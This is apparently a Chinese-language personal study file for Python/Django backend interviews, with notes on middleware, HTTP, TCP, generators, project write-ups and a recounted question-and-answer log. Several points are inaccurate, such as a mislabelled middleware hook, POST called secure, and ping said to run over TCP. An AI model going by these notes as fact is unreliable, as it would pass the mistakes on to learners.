2）中间件：作用于网站全局功能，应考虑使用中间件，因任何请求来和响应走都需要经过中间件，常用于用户访问频率限制、用户是否是黑名单或白名单、所有用户登录校验、获取用户权限RBAC等
3）Django中间件暴露给程序员五个自定义方法，且在特定条件下自动触发
a.process_request方法:请求来时，从上往下依次经过每一个中间件里面process_request，中间件中若没有该方法，直接跳过执行下一个，该方法内若自己返回HttpResponse对象就不再往后执行，会执行同一级别的process_reponse方法
b.process_response方法：响应走时，从下往上依次经过每一个中间件里面的process_reponse方法，该方法必须将形参response返回，若没有定义该方法直接跳过执行下一个。
c.process_view方法：路由匹配成功之后执行视图函数之前触发
d.process_view方法：当视图函数出现异常时自动触发
e.process_template_response方法：当视图函数执行完毕后并返回对象中含有render方法情况下才会执行
4）如何使用
a.在应用名下新建文件夹并在其目录下新建任意名称的py文件
b.重写类继承MiddlewareMixin
c.配置文件注册到中间件配置中，需手写字符串路径，如app01.aaa.bbb.MyMiddle
from django.shortcuts import HttpResponse
from django.utils.deprecation import MiddlewareMixin
class MyMiddle(MiddlewareMixin):
    def process_request(self, request):
        print("自定义process_request方法")
        return HttpResponse("自定义中间件peocess_request的返回值") # 直接原地返回
    def process_response(self, request, response):
        print("自定义process_response方法")
        return response # 必须返回给前台的数据
```

## Django创建项目的命令

```python
django-admin startproject 项目名称
python manage.py startapp 应用名
生成迁移文件：python manage.py makemigrations
执行迁移文件：python manage.py migrate 
Django是MTV框架，本质上还是MVC框架
MTV：M--models；T--templates；V--views
MVC：M--models；V--views；C--controller（路由匹配）
FBV：基于函数的视图
CBV：基于类的视图，提高代码的复用性
```

## re的match和search的区别

```python
match方法：只检测字符串开头位置是否匹配，成功通过.group()方法返回结果，失败返回None
s1 = 'abcabcabc'
print(re.match('abc', s1).group()) # abc
search方法：对整个字符串进行匹配，只要找到第一个匹配结果通过.group()方法返回结果，失败返回None
s1 = 'abcabcabc'
print(re.search('bca', s1).group()) # bca
贪婪匹配（.*）：能匹配的最大部分，匹配所有符合的
非贪婪匹配（.*?）:匹配越来越好，匹配第一个符合的
```

## http协议

```python
HTTP协议全称：超文本传输协议
# 四大特性
1）基于TCP/IP之上作用于应用层（TCP打电话，UDP发信息）
2）基于请求响应
3）无状态（不保存用户状态）--从而产生cookie  session  token
4）无连接（one night 情）--长连接（websocket--HTTP协议的大补丁）--用于聊天软件
# 数据格式
1）请求格式：请求首行（请求方式、协议版本）\r\n请求头（一堆键值对）\r\n\r\n请求体（真正的数据：发post请求才有，get请求不会有）
2）响应格式：响应首行\r\n响应头\r\n\r\n响应头
# 响应状态码
1）1XX：服务端已经成功接收你的数据，正在处理，可继续提交数据
2）2XX：服务端成功响应（200请求成功）
3）3XX：重定向
4）4XX：请求错误（403拒绝访问；404请求资源不存在）
5）5XX：服务器内部错误（500）
# 服务端
1）24小时提供服务
2）固定IP和端口
3）能承受高并发，即多个客户端连接
# 请求方式
1）GET请求：获取资源
2）POST请求：新建资源
3）PUT请求：更新资源
4）DELETE请求：删除资源
# 常见请求头
1）Host：主机和端口号
2）User-Agent：浏览器名称
3）Accept：传输文件类型
4）Cookie：字符串信息
```

## cookie和session的区别

```python
1）cookie数据放在客户端浏览器上，session数据放在服务器上
2）cookie数据不是很安全，爬虫可利用cookie，而session在一定时间内保存在服务器上，当访问增多耗能
3）将登陆等信息存放在session中，其他信息放在cookie中
4）两者是相辅相成的，当用户首次访问服务器，服务器会为每个用户单独创建一个session对象，并为每个session分配唯一一个id，id通过cookie保存到客户端，当用户再次访问服务器时，需将对应的id携带给服务器，服务器通过这唯一的id就可找到用户对应的session对象，从而达到管理用户
```

## post与get请求区别

```python
1）get请求数据会暴露在地址栏中，不安全，而post请求数据会放置在请求体中，安全
2）get请求对传输数据大小有要求，而post理论上不受限制，但各服务器有所规定
```

## 描述浏览器访问百度的过程

```python
1、域名解析：浏览器向DNS获取web服务器 www.baidu.com这个域名的 的ip地址
2、建立TCP连接：浏览器与对应ip地址的服务器进行TCP链接，端口为80
3、浏览器执行HTTP协议，发送GET请求，读取对应文件
4、服务器接收到请求后,返回网页信息 
5、客户端浏览器将这些信息组织成用户可以查看的网页形式
```

## cdn

```python
内容分发网络:目的是使用户可以就近到服务器取得所需内容，解决 Internet网络拥挤的状况，提高用户访问网站的响应速度。
```

## 进程间如何通信

```python
python提供了多种进程通信的方式，主要Queue和Pipe两种方式，其中Queue用于多进程通信，Pipe用于两个进程间通信
```

## GIL锁

```python
全局解释锁，每次只能一个线程获得cpu的使用权：为了线程安全，也就是为了解决多线程之间的数据完整性和状态同步而加的锁，因为我们知道线程之间的数据是共享的。
```

## TCP三次握手、四次挥手流程

```python
三次握手过程：
1）首先客户端向服务端发送一个带有SYN（请求询问） 标志以及随机生成的报文
2）服务端收到报文后返回一个报文给客户端
3）客户端再次发送带有ACk（回复）标志的报文给服务端，至此三次握手过程结束，客户端开始向服务端发送数据。
四次挥手过程（由于TCP是可双向通信，故每个方向必须单独进行关闭）：
1）客户端发送带有fin标识的报文给服务端，请求通信关闭
2）服务端收到信息后，回复ACK答应关闭客户端通信(连接)请求
3）服务端发送带有fin标识的报文给客户端，也请求关闭通信
4）客户端回应ack给服务端，答应关闭服务端的通信(连接)请求
```

## 斐波拉契数列

```python
def fib():
    i, k = 1, 0
    while 1:
        j = i + k
        yield j
        i = k
        k = j
for fn in fib():
    if fn > 1000:
        break
    else:
        print(fn)
```

## 闭包函数

```python
定义：在一个函数内部的函数，被外层函数包裹着，可访问到外层函数中的变量名，如下inner函数就是一个闭包函数。
def outer():
    num = 1
    def inner():
        print(num)  # 内层函数中不存在num 但可以访问到外层的num
    return inner
func = outer()  # func == inner
num = 1000
func()  # 输出结果：1
```

## 如何查找一个字符串中特定的字符？

```python
1）、find()方法：查找子字符串，若找到返回从0开始的下标值，若找不到返回-1
2）、index()方法：在字符串里查找子串第一次出现的位置，类似字符串的find方法，不过比find方法更好的是，如果查找不到子串，会抛出异常，而不是返回-1
```

## 求结果

```python
v = dict.fromkeys(['k1','k2'],[])
v['k1'].append(666)
print(v) #{'k1': [666], 'k2': [666]}
v['k1'] = 777
print(v)#{'k1': 777, 'k2': [666]}
#第一次字典的两个k指向的是同一块内存地址，所以k1的内存地址追加666，k2的值也同样会是666，而当给k1赋值时，改变了k1指向的内存地址，所以这个时候，k2不会随之发生变化
```

## *arg和**kwargs的作用

```python
*arg:用来接收溢出的位置参数，将接收的参数组织成元组
**kwargs：用来接收溢出的关键字参数，将接收的参数组织成字典
```

## 垃圾回收机制

```python
1）引用计数
2）标记清除
3）分代回收
```

## 下面代码的输出结果并解释

```python
def extendlist(val, list=[]):
	list.append(val)
	return list
list1 = extendlist(10)
list2 = extendlist(123, [])
list3 = extendlist('a')
print("list1 = %s" %list1) # list1 = [10, 'a']
print("list2 = %s" %list2) # list2 = [123]
print("list3 = %s" %list3) # list3 = [10, 'a']
解释：带有默认参数的表达式在函数被定义时计算，不是在调用时被计算
def func(a, b={}):
    b[a] = 'v'
    print(b)
func(1) #{1: 'v'}
func(2) #{1: 'v', 2: 'v'}
```

## 集合相关

```python
&:交集
|:并集
-：差集
^:对称差集
l1 = ['b'，'c'，'d'，'b'，'c'，'a'，'a']
l2 = list(set(l1)) # 去重
list1 = [1，2，3]
list2 = [3，4，5]
set1 = set(list1)
set2 = set(list2)
print(set1&set2) #相同元素
print(set1^set2) #不同元素
```

## 写一个列表生成式，产生公差为11的等差数列

```python
1.print([x*11 for x in range(10)])
```

## 现有字典`dic={'a':24,'g':52,'i':12,'k':33}`,对value值进行排序？

```python
dic={'a':24,'g':52,'i':12,'k':33}
print(dic.items())
# dict_items([('a', 24), ('g', 52), ('i', 12), ('k', 33)])
print(sorted(dic.items(),key=lambda name:name[1]))
# [('i', 12), ('a', 24), ('k', 33), ('g', 52)]
list1 = [{'name':'a'，'age':20}，{'name':'b'，'age':30}，{'name':'c'，'age':25}]
sorted(list1，key=lambda x:x['age']，reverse=True)
```

## 哪些情况下，`y!=x-(x-y)`会成立

```python
x,y是两个不相等的非空集合
```

## is和==的区别？

```python
is比较的是id
== 比较的是值
```

## 列举布尔值为False的常见值

```python
0, False , None , 空类型
```

## 字符串反转

```python
name[::-1]
```

## 逻辑与或非关系

```python
v1 = 1 or 3 --> 逻辑或，1和3都是真的，1或3，取决于第一个，即1
v2 = 1 and 3 --> 逻辑与，1和3都是真的，取决于第二个，即3
v3 = 0 and 2 or 1 or 4 --> 逻辑与，0和2，取0； 0或1，取1；1或4，取1，即1
```

## 三元运算和字典生成式

```python
三元运算：条件成立 if 条件 else 条件不成立
字典生成式：dict = {key: value for (key, value) in iterable}
```

## pep8规范

```python
1）函数与类之间用两个空行隔开
2）同一个类中，方法之间用一个空行隔开
3）函数、变量名用小写拼写，各单词以下划线相连
4）每行的字符数不应超过79
5）使用空格space表示缩进，而不要用tab制表符
```

## 进程与线程的区别？

```python
进程：一个程序的执行过程，而负责执行任务的是CPU，如执行WPS程序
线程：进程中的一部分，进程进程中包含多个线程在运行，如监听键盘输入、处理文字等
协程：单线程下实现并发，由程序员控制和保存状态
1）进程间相互独立，而同一个进程内的多个线程共享该进程的地址资源
2）创建线程的开销要远小于创建进程的开销
3）在主进程下开启多个线程，每个线程跟主进程的pid号一样，而多个进程都有不同的pid号
并发：同一时刻只能处理一个任务，但可以交替处理多个任务。(一个处理器同时处理多个任务)
并行：同一时刻可以处理多个任务。(多核的处理器同时处理多个不同的任务)，类比并发是一个人同时吃三个馒头，而并行是三个人同时吃三个馒头。 
同步：执行一个操作之后，需要主动等待返回结果；
异步：执行一个操作之后，不需要主动等待返回结果，若接收到结果通知，再回来执行刚才没执行完的操作。
同步和异步关心的问题是：要不要主动等待结果。
阻塞：在执行一个操作时，不能做其他操作；
非阻塞：在执行一个操作时，能做其他操作。
阻塞和非阻塞关心的问题是：能不能做其他操作。
多进程：CPU密集型，用于金融行业
多线程：IO密集型，用于爬虫
asynio：高并发模块
nginx：一款自由的、开源的、高性能的HTTP服务器和反向代理服务器，同时也是一个IMAP、POP3、SMTP代理服务器。可以用作HTTP服务器、方向代理服务器、负载均衡。
负载均衡：系统的扩展可分为纵向（垂直）扩展和横向（水平）扩展。纵向扩展，是从单机的角度通过增加硬件处理能力，比如CPU处理能力，内存容量，磁盘等方面，实现服务器处理能力的提升，不能满足大型分布式系统（网站），大流量，高并发，海量数据的问题。因此需要采用横向扩展的方式，通过添加机器来满足大型网站服务的处理能力。比如：一台机器不能满足，则增加两台或者多台机器，共同承担访问压力。这就是典型的集群和负载均衡架构
反向代理：保护真实服务器不被外界攻击，加速网络等
```

## 深浅拷贝

```python
可变类型（列表、集合、字典）：值变id不变；不可变类型（数值、字符串、元组）：值变id变
拷贝：当l2为l的拷贝对象时，l内的可变类型变化，l2变化；l内的不可变类型变化，l2变化，即简单的赋值
浅拷贝：当l2为l的浅拷贝对象时，l内的可变类型变化，l2变化；l内的不可变类型变化，l2不变，利用内置方法copy方法，简而言之是仅仅拷贝数据集合的第一层数据
深拷贝：当l2为l的深拷贝对象时，l内的可变类型变化，l2不变；l内不可变类型变化，l2不变，即利用内置方法deepcopy方法，简而言之是拷贝数据集合的所有层
```

## Linux命令

```python
1）查看IP：ip addr 或 ifconfig
2）查看端口：netstat -anptl
3）查看内存占用情况：top（动态展示）、free（当前空闲和已用内存的即时快照）、vmstat（虚拟内存统计信息）
```

# 技能

*熟悉Docker的使用

**Docker镜像操作，容器操作，目录挂载，服务部署，迁移与备份，私有仓库，dockerfile等操作

*熟练使用团队协作开发工具Git的基本操作，分支、日志、状态、提交等的使用

*熟练掌握Python，正在学习Go

**了解python

*熟练掌握Python匿名函数、列表推导式、字典生成式的使用

*熟练掌握Python三大器（装饰器，生成器，迭代器的使用）

*熟练掌握Django的缓存机制，并修改了缓存机制，使用redis进行缓存，对频繁请求的接口进行缓存处理,

*熟练使用Django，ORM单表及多表操作，了解request请求生命周期

*熟悉django中间件流程，并且可以自主设计中间件

*熟练使用Django中Forms,Auth,ContentType以及第三方插件django-cors-header解决请求跨域问题

*熟练使用Django-rest-framework框架

*熟练使用Celery异步任务消息队列的使用

*熟练使用highcharts，antv，Echarts图表工具的使用

*了解Flask框架的使用

*熟练掌握Python-django orm操作Mysql数据库增删改查

*熟悉MySQL事务，悲观锁乐观锁，查询优化，索引优化，主从复制

*了解Redis，mongodb数据库的使用

*了解redis的一主多从，哨兵高可用

*熟悉Python网络编程，以及多线程，多进程

*了解Linux文件管理，基本命令

*了解轮询，长轮询，websocket的使用，以及websocket的原理。

*了解HTML、Css，JavaScript，及Bootstrap，ui-element等框架，了解Vue框架

*了解Numpy,Pandas,Matplotlib等数据分析相关工具

*了解requests-html,BeautifulSoup,requests,re,xpath,Selenium等爬虫相关模块，了解Scrapy框架

# 谈项目

1. 所有的项目都是前后端分离的项目
2. 架构基本上都是B/s架构（服务器与浏览器）
3. 框架基本相同Django+RestFramework+MySQL+Redis+celery;
4. 

监控报警、负载均衡、冗余、高可用、数据库集群、存储、安全、虚拟化等的部署和设计

## 短视频的项目

2019.7~2019.12

```
1.1.所有的项目都是前后端分离的项目
2.架构基本上都是B/s架构（服务器与浏览器）
3.框架基本相同Django+RestFramework+MySQL+Redis+celery;
*项目介绍:基于Django-rest-framework框架实现在线观看短视频平台,为了满足广大人民群众饭后娱乐渠道少的
需求，推出这么一款在线网页浏览短视频类型的网页，实现在线观看，以及会员视频等功能,使用Redis存储临时数据,并通过Redis实现了轮播图的缓存。
*责任描述:
*1.负责编写自定义jwt和restframework框架的认证组件实现接口安全控制;
	全称：json web token djangorestframework-jwt
	
*2.对用户API访问进行频率控制;
	自定义中间件完成频率控制
	可以使用装饰器来控制
*3.基于ModelSerializer序列化短视频模块数据;
	
*4.参与数据库模型表的设计。
*5.使用Xadmin管理后台的展示;
*6.自定义分页器Pagination工具实现分页;
	
*7.基于支付宝接口的会员视频的实现;
	这个是根据配置文件进行配置，另外建立支付表和回执表进行存储
*项目实现多方式登陆。
	邮箱登陆，用户名密码登陆，手机验证码登陆，手机号密码登陆
*8.项目可基于短信平台实现短信消息登陆;
	腾讯云的短信平台，这些配置就是根据配置文件进行配置，然后进行调用
	将使用频率控制组件进行控制，防止用户频繁的发送短信，在1分钟只能发送一次等。或者设计一天多少次都是可以的。
	需要自定义一些频率控制
	跨域使用了中间件，当然可以使用django-cors-header也可以，websocket可以使用
	自定义过滤器中间件
	使用celery做异步任务，使用过程中让它进行登陆或者注册的时候可以降低等待，减少io阻塞，比如我在发送邮箱验证码的时候会做io操作需要等待，这个时候发送短信验证码也是选哟等待，使用异步的好处就是减少等待，提高效率，另外在上传的时候也有回执，这个时候使用celery好处就是能够快速上传。也做过celery使用定时任务，这个在爬虫的时候使用过。
	redis在这里面主要是使用了对token进行缓存，这个我的验证就可以进行时间缓存，缓存时间等。
	redis也对了code手机验证码进行缓存，一般缓存时间为60秒，这个在60秒内我的手机登陆都可以进行使用，过了这段时间就会自动清除。
	redis做了排行榜，
	redis做了视频缓存，这个好处就是能够减少sql操作
	视频操作主要是借用了第三方服务器（千牛云或者腾讯云），这个好处是借用了cdn,就是内容分发技术，能够让我访问更加快速。
	直接通过前端传递过来 的连接进行存储这个在访问的时候就会进行找到视频播放的连接，进行返回，这个在前端进行访问的时候也会更加的快速，并且在各地都能够进行快速访问。
	断点续传：
```

2018.11~2019.3

## 微信小程序后台开发

```
2018.11~2019.3
微信小程序后台开发
后台：Django+RestFramework+MySQL+Redis+celery异步框架;
*项目介绍:基于Django-rest-framework框架实现微信小程序的后台开发,满足人民群购物的需求，方便人们购物，推广出一款微信小程序，实现微信小程序的购物,修改Memcache缓存，使用Redis存储临时数据,并通过Redis实现了轮播图的缓存，使用用Celery异步任务消息队列,实现注册功能。

*责任描述:
*1.参与数据库模型表的设计和讨论。
*2.设计一个中间件记录接口访问的日志，记录请求时间，请求方法，请求的接口路径，请求的用户，请求的ip以及请求的参数。
*3.负djangorestframework-jwt框架的认证组件实现接口安全控制;
*4.对用户API访问进行频率控制;
*5.基于Serializer序列化返回数据;
*6设计一个后台管理系统;
*7.自定义分页器Pagination工具实现分页;

```

2018.6~2018.8

## 项目发布系统

```
2018.6~2018.8
项目发布系统
开发环境：python+django+ModelForm+MySQL+websocket+gojs+ajax
项目介绍：基于django实现一个项目发布的系统，可以直接进行github上拉取文件，然后可以上传到服务器上，并且可以实现在上传前后的安装软件，执行命令。进行部署。而且可以实时展示项目发布的进程。
*责任描述（python-django后台）:
*1.负责设计数据库的表结构;
*2.负责使用MOdelForm组件创建表单并进行钩子验证存储数据;
*3.负责调用gitpython从github上拉取文件源码并进行打包;
*4.paramiko模块操作远程服务器，上传代码并执行命令。
*5.使用channels模块并且进行配置使django支持websocket，实现信息同步。
*6.后台做好数据返回给前台用gojs进行渲染;
	gitpython主要就是对github或者码云等执行命令，进行拉取代码等的操作
	paramiko里面使用了ssh进行连接远程操作，这样我们就可以直接进入系统，将代码放入系统，并且可以执行一些安装命令，下载命令，比如下载nginx,requests等模块
	channels的使用就是非常简单，直接配置，它是支持websocket的功能模块，另外dwebsocket也是支持的
	协议使用asgi异步协议进行配置
	gojs主要是一种前端流程图的渲染，根据要求进行返回给前端，这样有利于前端的使用
	
	

```

## 音乐后台项目

```

2018.1--2018.9
音乐后台项目
项目描述:
平台整合了海量的资源，用户只需要搜索栏目输入歌曲名称或者音乐人名称，就可以轻松寻得心仪的音乐曲目
负责部分:
1.登入注册用短信验证,且用jwt验证用户信息
2.拥有功能:歌曲专辑分类，收藏,下载,取消收藏,搜索
3.django搭建后台，使用了drf框架
4.采用了redis进行存储数据线且有效期为一天，用redis缓存里的数据来渲染前台vue
5.数据存储:所有渲染数据均存redis数据库中,歌曲，专辑,歌曲相关信息存储与mysql中
6.数据查找:利用orm进行映射(主要是为了更加灵活对数据进行处理没用seriallizer进行序列化)
7.返回排行榜前50查询
8.支持歌曲名,歌手名搜索

```

## 公司考勤系统

```

2017.10~2018.9
2017.10~2018.2首次开发，2018.7~2018.9二次开发
公司考勤系统
开发环境: DRF + Mysql +VUE+ LayUI+websocket
项目介绍: 为了统计公司员工的考勤信息是否合格, 实现了部门以及小组的方便管理，组长以及项目经理可以发布任务和热点信息,员工可以记录工作日志以及内部聊天功能。
责任部分：
1.通过Django的RBAC权限组件完成小组以及权限的分配
2.调用百度人脸识别接口 完成人脸录入数据库 和 人脸签到 签退功能
3.采用websocket 实现聊天室功能
```

## 开发LPC 云商城 

```
2016.10~2017.4
开发LPC 云商城 
快速开发的一个硬件销售网站，主要分为前端硬件列表、详情、个人中心页面以及购物车和订单功能，还有管理后台的实现。
1.使用Ajax实现登录注册和评论功能
2.使用事务实现订单提交操作，保证操作原子性
3.使用Celery消息队列完成异步发送邮件的任务
4.使用Redis缓存访问频率高的页面
5.使用Echarts进行信息的图表展示
6、登录注册:用户注册时需要发送邮件(使用itsdangerous 生成)或短信验证码进行激活,使用Celery 队列异步发送,保证用户体验。图形验证码使用第三方库Captcha 实现
7、商品列表页和详情页:使用Redis 缓存频繁访问的页面
8、用户中心:用户中心频繁操作功能,使用Redis 缓存
9、订单功能:为保证操作的原子性,使用MySQL 的事务来实现订单功能
```

# python基础

## pep8规范

```python
1）函数与类之间用两个空行隔开
2）同一个类中，方法之间用一个空行隔开
3）函数、变量名用小写拼写，各单词以下划线相连
4）每行的字符数不应超过79
5）使用空格space表示缩进，而不要用tab制表符
```



## 迭代器

迭代器：迭代的工具，迭代是更新换代，就像传宗接代一样。单纯的重复就不算迭代。迭代的每一次结果都是基于上一次结果来的。

### 一、可迭代对象

python中一切皆对象，如

```python
# 可迭代(具有__iter__方法)   对象

x = 1  # 不可迭代对象(数字类型为不可迭代对象)

s = 'nick'  # 可迭代对象
s.__iter__()
lt = [1, 2, 3]  # 可迭代对象
dic = {'a': 1, 'b': 2}  # 可迭代对象
tup = (1,)  # 元组只有一个元素必须得加逗号# 可迭代对象
se = {1, 2, 3}  # 可迭代对象
f = open('time.py')  # 可迭代对象(文件类为可迭代器对象)


def func():  # 不可迭代对象
    pass

```

总结：

有__iter__()方法的对象就是可迭代对象,然后出了数字类型和函数之外都是可迭代对象,通过\__next\__进行迭代

```python
# 迭代器对象: 具有__iter__以及__next__方法的叫做迭代器对象
s = 'nick'  # 可迭代对象,不属于迭代器对象, 基于索引(基于上一次结果)通过__next__进行迭代
s.__iter__()
lt = [1, 2, 3]  # 可迭代对象,不属于迭代器对象
dic = {'a': 1, 'b': 2}  # 可迭代对象,不属于迭代器对象
tup = (1,)  # 元组只有一个元素必须得加逗号# 可迭代对象,不属于迭代器对象
se = {1, 2, 3}  # 可迭代对象,不属于迭代器对象
f = open('time.py')  # 可迭代对象,迭代器对象


# 只有文件是迭代器对象
```

### 二、可迭代器对象

只有字符串和列表都是依赖索引取值的，而其他的可迭代对象都是无法依赖索引取值的。因此我们得找到一个方法能让其他的可迭代对象不依赖索引取值。

在找到该方法前，首先我们给出迭代器对象的概念：可迭代的对象执行`__iter__`方法得到的返回值。并且可迭代对象会有一个`__next__`方法。

总结：

迭代器对象：执行可迭代对象的`__iter__`方法，拿到的返回值就是迭代器对象。

特点：

1. 内置`__next__`方法，执行该方法会拿到迭代器对象中的一个值
2. 内置有`__iter__`方法，执行该方法会拿到迭代器本身
3. 文件本身就是迭代器对象。

缺点：

1. 取值麻烦，只能一个一个取，并且只能往后取，值取了就没了
2. 无法使用len()方法获取长度

### 三、for循环原理

因为迭代器使用`__iter__`后还是迭代器本身，因此for循环不用考虑in后的对象是可迭代对象还是迭代器对象。

由于对可迭代对象使用`__iter__`方法后变成一个迭代器对象，这个迭代器对象只是占用了一小块内存空间，他只有使用`__next__`后才会吐出一个一个值。如`lis = [1,2,3,4,5,...]`相当于一个一个鸡蛋，而`lis = [1,2,3,4,5,...].__iter__`相当于一只老母鸡，如果你需要蛋，只需要`__next__`即可。

```python
lt = [1,2,3]
lt_iter = lt.__iter__()
while 1:
    try:
        print(lt_iter.__next__())
    except StopIteration:
        break
# 1. 首先使用iter把lt变成迭代器对象;对于文件也要使用iter方法吧文件再一次iter下
# 2. 然后使用next方法进行迭代取值
# 3. 判断StopIteration异常,遇到异常终止
```



## 生成器

边执行边计算

yield 阻塞函数的执行，不会进行回收

### 一、yield关键字

yield的英文单词意识就是生产，在函数中但凡出现yield关键字，在调用函数，就不会继续执行函数体代码，而是会返回一个值。

```python
def func():
    print(1)
    yield
    print(2)
    yield
g = func()
print(g)

#输出：# generator 生成器
<generator object func at 0x0000019C5C5BD448>

```

生成器 的本质就是迭代器，同时也并不仅仅是迭代器，不过迭代器之外的用途实在是不多，所以我们可以认为：生成器提供了非常方便的自定义迭代器的途径。并且从python2.5+开始，[PEP 342:通过增强生成器实现协同程序的实现位生成器加入了更多的特性，这意味着，生成器还可以完成更多的工作。这部分我们会在稍后的部分介绍。

```python
def func():
    print('from func 1')
    yield 'a'
    print('from func 2')
    yield 'b'

g = func()
print(g.__iter__())
print(g.__iter__()==g)
res1 = g.__next__()
print(res1)
res2 = next(g)
print(res2)

#输出：
<generator object func at 0x00000172C20B2DC8>
True
from func 1
a
from func 2
b
```

# 面试题

jwt加密

权限，认证，频率

```
    def validate(self, attrs):
        user = self._get_user(**attrs)
        
        # 签发token，并将user和token存放到序列化对象中
        payload = jwt_payload_handler(user)
        token = jwt_encode_handler(payload)

        self.user = user
        self.token = token

        return attrs
```

## python 框架

熟悉Django、Flash、Bottle、Pyramid等Python后端框架，熟悉ORM框架及优化.

## 如何提高网站并发量

```python
#1 静态文件（图片，js，css），不放在自己服务器，放到花钱买的服务器上（七牛云，阿里云的oss对象存储）使用cdn，单独自己搭建文件服务器（fastfds）
#2 精灵图（一个大图，只加载一次，定位）
#3 前端缓存：中间件：response[Cache-Control]="dasd"   Cache-Control: max-age=600

# nginx
	-nginx能不能挡住这么高的并发量
  	-挡不住：1 dns解析，不通的ip地址，访问不通的服务器
					  2 在nginx之前再当个负载均衡硬件（f5）---分发给10个nginx
      			3 限流：丢掉一些请求，访问不到了（服务器不会崩）
    -挡住了：
    	      1 uwsgi(部署)+django  用集群，增大机器性能
      			2 选用异步web框架：sanic、tornado  （django，3.0以前，flask ，都是同步框架）
# pythonweb
		-进项目了：
  				1 用缓存----》单机，redis集群，主从，不走mysql
    、		 2 用异步----》celery，rabbitmq  请求来了，直接丢到消息队列，直接返回，异步的去处理请求
    			3 es
    		  3 优化sql，优化代码（逻辑）
      		4 mysq主从做读写分离
        	5 项目控制，限流，降级
        
# 语言层面（解释性和编译型）
	-go，性能高
  
# 架构层面
	-微服务：限流，降级，熔断（了解限流，降级，熔断，写到简历上）
```

## 接口评审

针对同一个接口，根据实际业务需求，为解决接口兼容性问题，可以对接口进行版本扩展，命名规范为“名词”+“动词”+“版本号”形式，版本号采用v1、v2、v3形式命名

接口中统一使用小写字母

根据RFC3986定义，URI是对大小写敏感的，所以为了避免歧义，我们尽量用小写字符。

接口管理规范

## 架构管理规范

代码管理规范

　　无规矩不成方圆，微服务架构下，代码的管理一般采用git进行管控，因此，在使用git进行版本控制时，应遵循一些原则及规范。

2.1.  代码管理原则

　　代码管理的原则，用于确保代码管理过程中不出现原则性错误，出现原则性错误，则会出现许多无用的操作，基本原则如下：

* 模式确实后，必须严格遵循执行；
* 提交代码时，禁止代码强制提交；
* 代码提交时，必须进行注释说明；
* 代码提交时，必须按照规范执行；
* 出现冲突时，必须进行确认处理；

## 最有成就感的项目，学到经验，让自己比较踏实，让自己得到启发的项目

 接口文档怎么维护，如何维护三端（小程序，安卓，网页等）连接，以一套接口为原则，接口冲突怎么解决

mysql存储过程

小程序的类型，什么类型的项目

商城类型

mysql的主从复制，主从服务

项目发布的过程（上传-发布），上线，发布，测试，谁发布测试

pandas库有哪些函数，介绍pandas函数的作用

rpa技术

介绍项目过程中，测试完之后是由运维发布，测试让运维发版

接触自动化测试

逻辑能力和算法能力

如果一个评估项目，需要一个月的时间，用什么心态和方法来圆满完成。

讲一讲项目组之间如果出现了进度紧张，应该怎么处理

做web项目不懂的，如何让一个不认识的同事来帮你，如何请教他

如何和前端有冲突，比如一个方法的争议，如何处理

	之前有干过测试或者运维吗		答：测试就是那样，运维的话开发过一个cmdb项目，还问了我一个测试的工具，我不知道，回答了个不了解。
	多进程多线程区别    			答：进程是资源单位，线程是最小调度单位，然后扯到了gil锁，扯到了垃圾回收机制
	数据库怎么提高查询效率，		答：建立索引
	建立索引有什么缺点，		答：这个不了解
	常用的web后台开发框架，		答：django
	url是怎么找到views的，		答：讲了一下生命周期，然后讲了as_view 和dispatch
	基础linux命令			答：ls cat vim mkdir 之类的，然后他就马上问下一个问题了
	列表和元组有什么区别，		答：列表是可变类型，元组是不可变类型，但元组其实是可以改的，只不过默认的不去改
	django是怎么实现异步任务的，		答：用celery+redis提交异步任务，然后他又问了一次是怎么实现的，我说因为他单独开了一个socket
	用redis+celery的时候，redis有什么异常吗。答：没遇到什么异常
	数据库事务的了解			答：事务特性，举例银行
	介绍一下自己，在之前公司有什么收获，学到什么      答：扯了一波犊子
	挑一个你的项目来讲一下		            答：看着简历上写的直接分析一波，尽可能的多讲了很多
	你要怎么来开多线程     			答：直接用Threading模块开启多线程 或者用线程池的方式
	讲一下python的Gil				答：讲了多线程不能利用多核，多进程可以，gil是用来解决垃圾回收机制问题的
	讲一下数据库的连表有哪些			答：左连 右脸 内联 自关联
	内存里的东西是退出python之后全都消失吗		答：不一定，有些相互引用了的东西不会被回收
	装饰器是怎么样的            			 答：两大原则，装饰器作用都讲了。
	了解虚拟化技术吗？容器这些			答：docker比较擅长的。
	
	python数据类型说一下		答：巴拉巴拉
	见一下列表元祖和字典		答：讲一下可变不可变，有序无序
	字典内部是怎么存储数据的   答：开辟一块内存空间，申请一个名称空间，指向内存空间
	多进程和多线程怎么开		答：直接开或者池，扯到gil锁
	数据分析有做过吗			答：用三个模块，清洗了数据，给前端做了个图表返回去
	数据库有做过优化吗			答：业务量大的时候，建立主从，实现读写分离
	用了哪些数据库			答：mysql redis
	讲一下left join 和inner join的区别	答：一个左连是左边所有数据都展示出来，内联两个表都展示
	知道union 和union all 的区别吗		答：union会自动压缩多个结果集合中的重复结果，而union all则将所有的结果全部显示出来，不管是不是重复。   
	进程之间怎么通信			答：通过队列或者管道，生产者消费者模型
	
	二面：
	讲一下python的线程			答：讲了多线程 多进程 gil
	jwt是干嘛的，怎么实现的		答：用户认证，加密，三个部分加密（最重要），校验。
	mysql的乐观锁悲观锁			答：逻辑实现的乐观锁，物理实现的悲观锁
	讲一下具体应用场景（乐观锁）		答：讲了一个订单
	讲一下事务			答：银行转账
	讲一下事务的隔离级别		答：不了解
	讲一下脏读幻读，不可重复读		答：我回答错了
	讲一下协程是怎么实现的		答：用第三方包gevent，然后他说是yield，我解释了一下
	讲一下垃圾回收机制		答：引用计数，相互引用，分代回收
	你多线程是怎么实现的，三方包吗？	答：对，直接开启多线程或者用线程池
	redis的数据类型			答：字符串，哈希，集合，有序集合，数组
	redis主从讲一下			答：一主多从 一主一从
	主从的缺点是什么			答：主库挂了就完蛋了
	redis你都用来做了些什么		答：做消息队列，做缓存
	redis数据怎么持久化存储		答：忘记了
	redis的哨兵讲一下			答：哨兵用来实现高可用巴拉巴拉
	python现在是什么版本了		答：3.8
	3.7和3.8有什么区别			答：不知道
	
	装饰器是什么			答：两大原则
	深浅拷贝				答：一层两层的说
	一个函数超过五秒就退出		答：不记得了
	linux怎么查看端口			答：支支吾吾
	linux怎么查看内存占用情况		答：支支吾吾
	ping这个命令的底层协议是什么		答：tcp
	tcp建立连接			答：三次握手四次挥手
	tcp的回执是什么包			答：不记得了
	django请求生命周期		答：讲了一下生命周期
	wsgiref和uWSGI的区别	 答：并发量不同
	redis五大数据类型			答：巴拉巴拉
	redis如果存多了要怎么办		答：持久化存储
